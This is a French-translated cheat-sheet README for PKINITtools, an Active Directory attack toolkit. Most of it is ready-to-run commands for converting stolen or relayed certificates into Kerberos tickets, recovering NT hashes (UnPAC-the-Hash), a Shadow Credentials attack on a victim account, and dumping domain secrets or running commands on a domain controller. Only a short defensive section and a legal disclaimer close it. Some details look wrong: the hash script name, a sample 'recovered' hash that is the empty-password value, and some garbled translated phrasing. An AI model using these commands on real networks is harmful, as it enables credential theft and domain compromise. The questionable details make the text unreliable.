<!-- language-home-navigation -->
[🏠 Page d'accueil Française](../../README.fr.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇮🇹 Italiano](README.it.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🎫 PKINITtools - Aide-mémoire complet

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
  ██████╗ ██╗  ██╗██╗███╗   ██╗██╗████████╗████████╗ ██████╗  ██████╗ ██╗     ███████╗
  ██╔══██╗██║ ██╔╝██║████╗  ██║██║╚══██╔══╝╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██╔════╝
  ██████╔╝█████╔╝ ██║██╔██╗ ██║██║   ██║      ██║   ██║   ██║██║   ██║██║     ███████╗
  ██╔═══╝ ██╔═██╗ ██║██║╚██╗██║██║   ██║      ██║   ██║   ██║██║   ██║██║     ╚════██║
  ██║     ██║  ██╗██║██║ ╚████║██║   ██║      ██║   ╚██████╔╝╚██████╔╝███████╗███████║
  ╚═╝     ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝╚═╝   ╚═╝      ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚══════╝
       Kerberos PKINIT Authentication, Shadow Credentials & UnPAC-the-Hash Toolkit
```
<p align="center">
  <img src="https://img.shields.io/badge/PKINITtools-Kerberos_PKINIT-blue?style=for-the-badge" alt="PKINITtools">
  <img src="https://img.shields.io/badge/Author-Dirk--jan_Mollema-orange?style=for-the-badge" alt="dirkjanm">
  <img src="https://img.shields.io/badge/Category-Active_Directory_&_Network-green?style=for-the-badge" alt="Active Directory">
  <img src="https://img.shields.io/badge/License-MIT-red?style=for-the-badge" alt="Licence MIT">
</p>

<p align="center">
  <b>🌐 Outils pour la cryptographie à clé publique Kerberos pour l'authentification initiale (PKINIT), convertissant les certificats en tickets TGT et récupérant les hachages NT</b>
</p>

---

## 📋 Table des matières

- [Présentation et architecture PKINIT](#-overview--the-pkinit-architecture)
- [Utilitaires clés : `gettgtpkinit.py` et `getskeyhash.py`](#-key-utilities-gettgtpkinitpy--getskeyhashpy)
- [Installation](#-installation)
- [Conversion des certificats AD CS en Kerberos TGT](#-converting-ad-cs-certificates-to-kerberos-tgt)
  - [Utiliser un fichier PFX](#using-a-pfx-file)
  - [Utilisation de PFX encodés en Base64 (chaînes de relais)](#using-base64-encoded-pfx-relay-chains)
- [Récupération des hachages NT (UnPAC-the-Hash)](#-recovering-nt-hashes-unpac-the-hash)
-[Shadow Credentials Attack Workflow](#-shadow-credentials-attack-workflow)
- [Consommation du TGT avec Impacket & NetExec](#-consuming-the-tgt-with-impacket--netexec)
- [Tableau de référence rapide](#-quick-reference-table)
- [Considérations défensives et détection](#-considérations-defensives--détection)
- [Mentions légales](#-legal-disclaimer)

---

## 🎯 Présentation et architecture PKINIT

**PKINIT** (Public Key Cryptography for Initial Authentication in Kerberos, défini dans **RFC 4556**) est une extension du protocole Kerberos. Au lieu d'exiger le hachage du mot de passe secret d'un utilisateur (NTLM ou AES) pour demander un ticket Kerberos Ticket Granting (TGT), PKINIT permet à un client de prouver son identité à l'aide de **certificats numériques X.509 et de paires de clés privées/publiques**.

Créé par le célèbre chercheur Active Directory **Dirk-jan Mollema (@_dirkjan)**, **PKINITtools** fournit les primitives Python essentielles pour :
1. Authentifiez-vous auprès des contrôleurs de domaine Active Directory via PKINIT à l'aide de certificats numériques extraits ou relayés.
2. Obtenez un fichier Kerberos TGT standard (`.ccache`).
3. Récupérez le **NTLM Hash** en texte clair du compte via le mécanisme **UnPAC-the-Hash**.

---

## 🧰 Utilitaires clés : `gettgtpkinit.py` et `getskeyhash.py`

- **`gettgtpkinit.py`** : communique avec le KDC (Kerberos Key Distribution Center) via le port 88, présente le certificat et demande un TGT blindé, en l'enregistrant sous forme de fichier Kirbi ou ccache.
- **`getskeyhash.py`** : interroge le PAC Kerberos (Privilege Attribute Certificate) renvoyé dans le ticket PKINIT pour calculer et exposer le hachage NT statique du compte.

---

## 📥Installation
```bash
# Clone GitHub repository
git clone https://github.com/dirkjanm/PKINITtools.git
cd PKINITtools

# Install dependencies (requires impacket, cryptography, minikerberos)
pip3 install -r requirements.txt
pip3 install .
```
---

## 🎫 Conversion des certificats AD CS en Kerberos TGT

Lorsque vous obtenez un certificat Active Directory via Certipy, Coercer ou NTLM Relay :

### Utiliser un fichier PFX
```bash
# Request TGT using a client certificate file (.pfx)
gettgtpkinit.py -cert-pfx administrator.pfx -pfx-pass 'CertPass123' corp.local/administrator admin.ccache
```
### Utilisation de PFX codés en Base64 (chaînes de relais)

Souvent, `ntlmrelayx` imprime les certificats sous forme de chaîne brute base64 lors des attaques AD CS ESC8 :
```bash
# Convert base64 certificate directly into a Kerberos TGT for Domain Controller (DC01$)
gettgtpkinit.py -pfx-base64 "MIIKggIBAzCCCXwGCSqGSIb3DQEHA..." corp.local/DC01\$ dc01.ccache
```
---

## 🔑 Récupération des hachages NT (UnPAC-the-Hash)

Lorsqu'un compte s'authentifie auprès de PKINIT, le contrôleur de domaine signe le PAC avec une structure PAC_CREDENTIAL_INFO contenant le **hachage NTLM** statique du compte (chiffré avec une clé AS-REP temporaire). `getskeyhash.py` décrypte cette structure :
```bash
# Extract the NTLM hash directly from the ticket and KDC
getskeyhash.py -hashes :7fc508... corp.local/administrator admin.ccache

# Output format:
# [*] Found PAC DATA
# [*] Decrypted PAC_CREDENTIAL_INFO
# [!] Recovered NT Hash: aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
```
Avec le hachage NT en main, vous pouvez immédiatement effectuer un **Pass-the-Hash** ou un cracking hors ligne !

---

## 👥 Flux de travail d'attaque des informations d'identification fantômes

Lorsque vous disposez d'un accès en écriture sur un objet Active Directory (`GenericAll`, `GenericWrite`, `WriteProperty` sur `msDS-KeyCredentialLink`) :
```bash
# 1. Use pyWhisker to inject a newly generated key credential into the victim object
pywhisker.py -d "corp.local" -u "lowuser" -p "Password123" --target "TargetUser" --action "add" --export "targetuser.pfx"

# 2. Use PKINITtools to authenticate with the forged certificate
gettgtpkinit.py -cert-pfx targetuser.pfx -pfx-pass "pywhisker" corp.local/TargetUser target.ccache

# 3. Extract TargetUser's NT Hash
getskeyhash.py corp.local/TargetUser target.ccache
```
---

## 🚀 Consommer le TGT avec Impacket & NetExec

Une fois que `gettgtpkinit.py` génère un ticket `.ccache`, exportez-le vers l'environnement :
```bash
# Set Kerberos credential cache environment variable
export KRB5CCNAME=/path/to/admin.ccache

# Dump domain secrets via Impacket without passwords!
impacket-secretsdump -k -no-pass corp.local/administrator@dc01.corp.local

# Connect via Evil-WinRM using Kerberos ticket
evil-winrm -i dc01.corp.local -r corp.local

# Execute commands using NetExec with Kerberos auth
nxc smb dc01.corp.local -k --no-pass -x "whoami /priv"
```
---

## ⚡ Tableau de référence rapide

| Objectif | Commande |
|-----------|---------|
| **TGT via fichier PFX** | `gettgtpkinit.py -cert-pfx <FILE.pfx> <DOMAIN>/<USER> <OUT.ccache>` |
| **TGT via le certificat Base64** | `gettgtpkinit.py -pfx-base64 "<BASE64>" <DOMAIN>/<USER> <OUT.ccache>` |
| **Spécifiez le contrôleur de domaine**| `gettgtpkinit.py -dc-ip <DC_IP> -cert-pfx <CERT> <DOMAIN>/<USER> <TGT>` |
| **UnPAC-the-Hash (Obtenir NTLM)**| `getskeyhash.py <DOMAIN>/<USER> <TGT.ccache>` |
| **Passez TGT à Impacket** | `export KRB5CCNAME=<TGT.ccache>; impacket-secretsdump -k -no-pass <DOMAIN>/<USER>@<DC>` |
| **Passez TGT à NetExec** | `export KRB5CCNAME=<TGT.ccache>; nxc smb <DC> -k --no-pass` |

---

## 🛡️ Considérations défensives et détection

1. **ID d'événement 4768 (demande TGT) :** Active Directory enregistre les requêtes Kerberos TGT. Lorsque PKINIT est utilisé, le champ **Type de pré-authentification** affiche `16` (PKINIT), plutôt que `2` (PA-ENC-TIMESTAMP).
2. **Audit des modifications `msDS-KeyCredentialLink` :** L'ID d'événement 5136 enregistre les modifications des objets d'annuaire. Alerte lorsque les informations d’identification clés sont ajoutées à des comptes gérés non-Azure/Intune.

---

## ⚠️ Mentions légales

> [!ATTENTION]
> PKINITtools est destiné uniquement aux audits de sécurité Active Directory autorisés, aux opérations Red Team et à la recherche pédagogique. La manipulation de tickets Kerberos d'entreprise sans autorisation explicite est illégale.